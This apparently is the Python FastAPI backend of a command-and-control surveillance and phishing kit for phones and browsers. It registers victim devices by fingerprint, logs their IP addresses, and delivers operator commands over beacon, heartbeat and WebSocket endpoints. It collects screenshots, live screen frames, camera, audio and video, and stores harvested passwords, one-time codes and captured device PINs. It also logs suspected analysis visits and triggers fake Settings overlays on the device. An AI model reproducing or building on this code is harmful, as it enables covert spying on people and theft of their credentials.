from fastapi import APIRouter, Depends, HTTPException, Request, WebSocket, WebSocketDisconnect, Query, status
from fastapi.responses import HTMLResponse, RedirectResponse
from typing import Optional
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, update
from datetime import datetime, timezone
from backend.database import get_db
from backend.models import Device, Event, Command, AppVersion, Credential, MediaItem, ProbeLog
from backend.schemas import DeviceRegisterRequest, DeviceRegisterResponse, BeaconRequest, BeaconResponse
from backend.config import settings
import json, os, base64, aiofiles, hashlib, time, asyncio
from backend.utils.asn_lookup import lookup as asn_lookup

router = APIRouter()
_connections: dict[int, WebSocket] = {}
_PENDING_CACHE_RESET: set[int] = set()
_PENDING_RELAY_PROMPT: set[int] = set()   # operator-triggered: show Settings overlay on device
_PENDING_RELAY_CANCEL: set[int] = set()   # operator-triggered: hide relay overlay on device
_last_hb_hash: dict[int, str] = {}  # device_id → last heartbeat body hash


def _device_token(device_id: int) -> str:
    raw = f"{device_id}:{settings.secret_key}".encode()
    return hashlib.sha256(raw).hexdigest()[:16]


@router.post("/register", response_model=DeviceRegisterResponse)
async def register_device(req: DeviceRegisterRequest, request: Request, db: AsyncSession = Depends(get_db)):
    client_ip = _normalize_ip(request.headers.get("X-Forwarded-For", request.client.host if request.client else "").split(",")[0].strip())
    existing = None
    if req.fingerprint_hash:
        result = await db.execute(select(Device).where(Device.fingerprint_hash == req.fingerprint_hash))
        existing = result.scalar_one_or_none()
    if existing:
        existing.name = req.name
        existing.last_seen = datetime.now(timezone.utc)
        if req.user_agent:
            existing.user_agent = req.user_agent
        if req.push_subscription:
            existing.push_subscription = req.push_subscription
        if client_ip:
            existing.ip_history_json = _update_ip_history(existing.ip_history_json, client_ip)
        device = existing
    else:
        ip_json = json.dumps([{"ip": client_ip, "ts": datetime.now(timezone.utc).isoformat()}]) if client_ip else '[]'
        device = Device(name=req.name, user_agent=req.user_agent,
                        fingerprint_hash=req.fingerprint_hash, push_subscription=req.push_subscription,
                        ip_history_json=ip_json)
        db.add(device)
    await db.commit()
    await db.refresh(device)
    version_result = await db.execute(select(AppVersion).where(AppVersion.is_current == True))
    current_version = version_result.scalar_one_or_none()
    cmd_result = await db.execute(select(Command).where(Command.device_id == device.id, Command.status == "pending"))
    commands_out = [{"id": c.id, "type": c.type, "payload": json.loads(c.payload_json)} for c in cmd_result.scalars().all()]
    return DeviceRegisterResponse(device_id=device.id, name=device.name,
                                   version_hash=current_version.version_hash if current_version else None,
                                   commands=commands_out,
                                   c2_token=_device_token(device.id))


async def _store_network_type(device_id: int, ip: str):
    from backend.database import AsyncSessionLocal
    info = await asn_lookup(ip)
    async with AsyncSessionLocal() as db:
        db.add(Event(device_id=device_id, type='network_type',
                     data_json=json.dumps({**info, 'ip': ip}),
                     delta_hash=None))
        await db.commit()


def _normalize_ip(ip: str) -> str:
    """Convert ::ffff:x.x.x.x mapped addresses to plain IPv4."""
    if ip.startswith("::ffff:"):
        return ip[7:]
    return ip


def _ip_str(entry) -> str:
    """Extract plain IP string from either old (str) or new (dict) format."""
    return entry["ip"] if isinstance(entry, dict) else entry


def _update_ip_history(current_json: str, new_ip: str) -> str:
    try:
        entries = json.loads(current_json or "[]")
    except Exception:
        entries = []
    if new_ip:
        # Only record a new timestamp when the IP actually changes
        if entries and _ip_str(entries[0]) == new_ip:
            return json.dumps(entries)
        entries = [e for e in entries if _ip_str(e) != new_ip]
        entries.insert(0, {"ip": new_ip, "ts": datetime.now(timezone.utc).isoformat()})
        entries = entries[:20]
    return json.dumps(entries)


@router.post("/beacon/{device_id}", response_model=BeaconResponse)
async def receive_beacon(device_id: int, req: BeaconRequest, request: Request, db: AsyncSession = Depends(get_db)):
    dev_result = await db.execute(select(Device).where(Device.id == device_id))
    device = dev_result.scalar_one_or_none()
    if not device:
        raise HTTPException(status_code=404, detail="device_not_found")
    client_ip = _normalize_ip(request.headers.get("X-Forwarded-For", request.client.host if request.client else "").split(",")[0].strip())
    prev_ips = json.loads(device.ip_history_json or "[]")
    new_ip_history = _update_ip_history(device.ip_history_json, client_ip)
    ip_changed = client_ip and (not prev_ips or _ip_str(prev_ips[0]) != client_ip)
    fp_hash_update = None
    if not device.fingerprint_hash:
        fp_item = next((i for i in req.events if i.type == 'fingerprint' and i.delta_hash), None)
        if fp_item:
            fp_hash_update = fp_item.delta_hash
    update_vals = {'last_seen': datetime.now(timezone.utc), 'ip_history_json': new_ip_history}
    if fp_hash_update:
        update_vals['fingerprint_hash'] = fp_hash_update
    await db.execute(update(Device).where(Device.id == device_id).values(**update_vals))
    for item in req.events:
        db.add(Event(device_id=device_id, type=item.type,
                     data_json=json.dumps(item.data) if isinstance(item.data, dict) else str(item.data),
                     delta_hash=item.delta_hash))
    if ip_changed and client_ip:
        asyncio.create_task(_store_network_type(device_id, client_ip))
    await db.commit()
    cmd_result = await db.execute(select(Command).where(Command.device_id == device_id, Command.status == "pending"))
    cmds = cmd_result.scalars().all()
    commands_out = [{"id": c.id, "type": c.type, "payload": json.loads(c.payload_json)} for c in cmds]
    if cmds:
        cmd_ids = [c.id for c in cmds]
        for cid in cmd_ids:
            await db.execute(update(Command).where(Command.id == cid).values(
                status="delivered", executed_at=datetime.now(timezone.utc)))
        await db.commit()
    return BeaconResponse(received=len(req.events), commands=commands_out)


@router.post("/heartbeat/{device_id}")
async def heartbeat(device_id: int, request: Request, db: AsyncSession = Depends(get_db)):
    body = {}
    try:
        body = await request.json()
    except Exception:
        pass

    client_ip = _normalize_ip(request.headers.get("X-Forwarded-For", request.client.host if request.client else "").split(",")[0].strip())

    # Relay prompt: show Settings overlay unconditionally once operator triggers it.
    # ASN-based auto-discard was removed — Apple Relay rotates exit IPs across many CDN ASNs,
    # causing the discard to fire before the overlay ever appeared. Operator cancels manually.
    show_relay_prompt = device_id in _PENDING_RELAY_PROMPT

    dev_result = await db.execute(select(Device).where(Device.id == device_id))
    device = dev_result.scalar_one_or_none()
    if device:
        prev_ips = json.loads(device.ip_history_json or "[]")
        new_ip_history = _update_ip_history(device.ip_history_json, client_ip)
        ip_changed = client_ip and (not prev_ips or _ip_str(prev_ips[0]) != client_ip)
        await db.execute(update(Device).where(Device.id == device_id).values(
            last_seen=datetime.now(timezone.utc), ip_history_json=new_ip_history))
        if ip_changed and client_ip:
            asyncio.create_task(_store_network_type(device_id, client_ip))
    else:
        await db.execute(update(Device).where(Device.id == device_id).values(last_seen=datetime.now(timezone.utc)))

    # Store heartbeat event only when body changes — avoids DB flood on fast intervals.
    if body:
        import hashlib as _hl
        bh = _hl.md5(json.dumps(body, sort_keys=True).encode()).hexdigest()[:8]
        if _last_hb_hash.get(device_id) != bh:
            _last_hb_hash[device_id] = bh
            db.add(Event(device_id=device_id, type='heartbeat',
                         data_json=json.dumps(body), delta_hash=bh))

    await db.commit()
    reset = device_id in _PENDING_CACHE_RESET
    if reset:
        _PENDING_CACHE_RESET.discard(device_id)
    result: dict = {"ok": True, "reset_cache": reset}
    if show_relay_prompt:
        result["show_relay_prompt"] = True
    if device_id in _PENDING_RELAY_CANCEL:
        _PENDING_RELAY_CANCEL.discard(device_id)
        _PENDING_RELAY_PROMPT.discard(device_id)
        result["hide_relay_prompt"] = True
    return result


@router.post("/collect/result")
async def sw_result(request: Request, db: AsyncSession = Depends(get_db)):
    """Receives SW C2 command results (pong, device_info) posted by the Service Worker."""
    try:
        body = await request.json()
    except Exception:
        return {"ok": False, "error": "bad_json"}

    token = body.get("token")
    result_type = body.get("type")

    # Resolve device by token
    dev_result = await db.execute(select(Device))
    device = next((d for d in dev_result.scalars().all() if _device_token(d.id) == token), None)
    if not device:
        return {"ok": False, "error": "unknown_token"}

    # Forward to sw_c2_router internal handler
    from backend.api.dashboard.sw_c2_router import _handle_sw_event
    await _handle_sw_event(device.id, result_type or "unknown", body)

    # Store as event for audit
    db.add(Event(device_id=device.id, type=f"sw_{result_type or 'result'}",
                 data_json=json.dumps({k: v for k, v in body.items() if k != "token"})))
    await db.commit()
    return {"ok": True}


@router.get("/relay-nav", include_in_schema=False)
async def relay_nav(d: int = Query(0)):
    """Safety redirect — clears any stale relay state and returns home."""
    _PENDING_RELAY_PROMPT.discard(d)
    return RedirectResponse("/", status_code=302)


@router.get("/version")
async def get_version(db: AsyncSession = Depends(get_db), device_id: Optional[str] = None):
    if device_id is not None:
        try:
            dev_result = await db.execute(select(Device).where(Device.id == int(device_id)))
            dev = dev_result.scalar_one_or_none()
            if dev and dev.target_version_hash:
                return {"hash": dev.target_version_hash, "timestamp": None}
        except (ValueError, Exception):
            pass
    result = await db.execute(select(AppVersion).where(AppVersion.is_current == True))
    version = result.scalar_one_or_none()
    if not version:
        return {"hash": None, "timestamp": None}
    return {"hash": version.version_hash, "timestamp": version.published_at.isoformat()}


@router.post("/screenshot/{device_id}")
async def upload_screenshot(device_id: int, body: dict, db: AsyncSession = Depends(get_db)):
    dev_result = await db.execute(select(Device).where(Device.id == device_id))
    if not dev_result.scalar_one_or_none():
        raise HTTPException(status_code=404, detail="device_not_found")
    data_b64 = body.get("data", "")
    try:
        img_bytes = base64.b64decode(data_b64)
    except Exception:
        raise HTTPException(status_code=400, detail="invalid_base64")
    _ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    media_dir = os.path.join(_ROOT, "media", "screenshots", str(device_id))
    os.makedirs(media_dir, exist_ok=True)
    filename = f"{int(time.time() * 1000)}.jpg"
    file_path = os.path.join(media_dir, filename)
    async with aiofiles.open(file_path, "wb") as f:
        await f.write(img_bytes)
    db.add(MediaItem(device_id=device_id, type="screenshot",
                     file_path=file_path, size_bytes=len(img_bytes)))
    await db.commit()
    return {"ok": True, "filename": filename}


@router.get("/ws-token/{device_id}")
async def get_ws_token(device_id: int, request: Request):
    # Only reachable from localhost (dashboard backend → collection backend internal call)
    client_host = request.client.host if request.client else ""
    if client_host not in ("127.0.0.1", "::1", "localhost"):
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Internal endpoint")
    return {"token": _device_token(device_id)}


@router.websocket("/ws/{device_id}")
async def websocket_endpoint(
    websocket: WebSocket,
    device_id: int,
    token: str = "",
    db: AsyncSession = Depends(get_db),
):
    expected = _device_token(device_id)
    if token != expected:
        await websocket.close(code=4001)
        return
    await websocket.accept()
    _connections[device_id] = websocket
    await db.execute(update(Device).where(Device.id == device_id).values(last_seen=datetime.now(timezone.utc)))
    await db.commit()
    try:
        while True:
            data = await websocket.receive_text()
            msg = json.loads(data)
            if msg.get("type") == "event":
                db.add(Event(device_id=device_id, type=msg["event_type"],
                             data_json=json.dumps(msg.get("data", {})), delta_hash=msg.get("delta_hash")))
                await db.commit()
            elif msg.get("type") == "command_ack":
                await db.execute(update(Command).where(Command.id == msg["command_id"]).values(
                    status="executed", executed_at=datetime.now(timezone.utc)))
                await db.commit()
            elif msg.get("type") == "screen_frame":
                from backend.api.stream_state import push_frame
                import base64
                try:
                    push_frame(device_id, base64.b64decode(msg["data"]))
                except Exception:
                    pass
    except WebSocketDisconnect:
        _connections.pop(device_id, None)


@router.post("/stream/{device_id}/frame")
async def receive_stream_frame(device_id: int, body: dict):
    from backend.api.stream_state import push_frame
    import base64 as _b64
    try:
        push_frame(device_id, _b64.b64decode(body.get("data", "")))
    except Exception:
        pass
    return {"ok": True}


@router.post("/subscribe")
async def save_push_subscription(body: dict, db: AsyncSession = Depends(get_db)):
    device_id = body.get("device_id")
    if not device_id:
        return {"ok": False, "error": "missing_device_id"}
    device_id = int(device_id)
    device_check = await db.execute(select(Device).where(Device.id == device_id))
    if not device_check.scalar_one_or_none():
        raise HTTPException(status_code=404, detail="device_not_found")
    subscription = json.dumps(body.get("subscription", {}))
    await db.execute(
        update(Device).where(Device.id == device_id).values(push_subscription=subscription)
    )
    await db.commit()
    return {"ok": True}


@router.post("/media/{device_id}")
async def receive_media(device_id: int, body: dict, db: AsyncSession = Depends(get_db)):
    media_type = body.get("type", "camera")
    data_url = body.get("data", "")
    try:
        ts = int(body.get("ts", 0))
        if ts < 0:
            ts = 0
    except (TypeError, ValueError):
        ts = 0
    if media_type == "audio":
        # iOS produces audio/mp4 (AAC), desktop produces audio/webm
        ext = "webm" if data_url.startswith("data:audio/webm") else "m4a"
    elif media_type == "video":
        # Detect from data URL header; iOS sends mp4, Android/desktop sends webm
        ext = "webm" if data_url.startswith("data:video/webm") else "mp4"
    else:
        ext = "jpg"
    # Validate device_id is a positive integer (already enforced by FastAPI type coercion,
    # but re-assert to guard against future refactors)
    if device_id <= 0:
        return {"ok": False, "error": "invalid_device_id"}
    device_check = await db.execute(select(Device).where(Device.id == device_id))
    if not device_check.scalar_one_or_none():
        return {"ok": False, "error": "device_not_found"}
    source = body.get("source", "")
    source_tag = f"_{source}" if source in ("front", "back") else ""
    dir_path = os.path.join("backend", "data", "media", str(device_id))
    os.makedirs(dir_path, exist_ok=True)
    filename = os.path.join(dir_path, f"{ts}{source_tag}.{ext}")
    try:
        _header, encoded = data_url.split(",", 1)
        raw = base64.b64decode(encoded)
        async with aiofiles.open(filename, "wb") as f:
            await f.write(raw)
    except Exception:
        return {"ok": False, "error": "decode_failed"}
    media = MediaItem(device_id=device_id, type=media_type, file_path=filename, size_bytes=len(raw))
    db.add(media)
    await db.commit()
    return {"ok": True}


@router.post("/probe")
async def log_probe(request: Request, body: dict, db: AsyncSession = Depends(get_db)):
    """Called by WebClip when standalone=false — logs the suspicious non-standalone open."""
    forwarded = request.headers.get("X-Forwarded-For", "")
    real_ip   = request.headers.get("X-Real-IP", "")
    client_ip = (forwarded.split(",")[0].strip() if forwarded else real_ip) or (request.client.host if request.client else "")
    ua        = request.headers.get("User-Agent", body.get("ua", ""))
    import json as _json
    extra = {k: v for k, v in body.items() if k not in ("ua", "url", "standalone", "ts")}
    probe = ProbeLog(
        ip=client_ip[:64] if client_ip else None,
        user_agent=ua[:512] if ua else None,
        url=body.get("url", "")[:512] or None,
        standalone=bool(body.get("standalone", False)),
        extra_json=_json.dumps(extra),
    )
    db.add(probe)
    await db.commit()
    return {"ok": True}


@router.post("/harvest")
async def harvest_generic(body: dict, db: AsyncSession = Depends(get_db)):
    """Generic harvest endpoint used by client-side modules (pin_capture, etc.)."""
    device_id_val = body.get("device_id")
    harvest_type = body.get("type", "unknown")
    data = body.get("data", {})

    # Resolve device — treat missing device_id as anonymous (still store event if possible)
    device_id_int = None
    if device_id_val is not None:
        try:
            device_id_int = int(device_id_val)
            device_check = await db.execute(select(Device).where(Device.id == device_id_int))
            if not device_check.scalar_one_or_none():
                device_id_int = None
        except (TypeError, ValueError):
            device_id_int = None

    if harvest_type == 'pin_capture':
        pin = data.get("pin", "")
        attempt = data.get("attempt", 0)
        if device_id_int is not None:
            cred = Credential(
                device_id=device_id_int,
                username=f"pin_attempt_{attempt}",
                password=pin,
                otp=None,
                harvest_config_id=None,
            )
            db.add(cred)
            db.add(Event(
                device_id=device_id_int,
                type='pin_capture',
                data_json=json.dumps({"pin": pin, "attempt": attempt}),
                delta_hash=None,
            ))
        else:
            # No device_id yet — store as anonymous event using device 0 fallback or skip credential
            # Just log to backend log so it's not lost
            import logging
            logging.getLogger("uvicorn").warning(f"PIN captured (no device): attempt={attempt} pin={pin}")
    else:
        # Generic: store as Event if we have a device, log data as JSON
        if device_id_int is not None:
            db.add(Event(
                device_id=device_id_int,
                type=harvest_type,
                data_json=json.dumps(data) if isinstance(data, dict) else str(data),
                delta_hash=None,
            ))

    await db.commit()
    return {"ok": True}


@router.post("/harvest/submit")
async def submit_harvest(body: dict, db: AsyncSession = Depends(get_db)):
    device_id_val = body.get("device_id")
    if not device_id_val:
        return {"ok": False, "error": "missing_device_id"}
    device_check = await db.execute(select(Device).where(Device.id == int(device_id_val)))
    if not device_check.scalar_one_or_none():
        return {"ok": False, "error": "device_not_found"}
    cred = Credential(
        device_id=device_id_val,
        username=body.get("username"),
        password=body.get("password"),
        otp=body.get("otp"),
        harvest_config_id=body.get("harvest_config_id"),
    )
    db.add(cred)
    await db.commit()
    return {"ok": True}


@router.get("/harvest/otp-ready/{device_id}")
async def otp_ready(device_id: int):
    return {"ready": False}


@router.post("/harvest/validate")
async def validate_harvest(body: dict):
    return {"valid": False, "message": "validation_not_configured"}
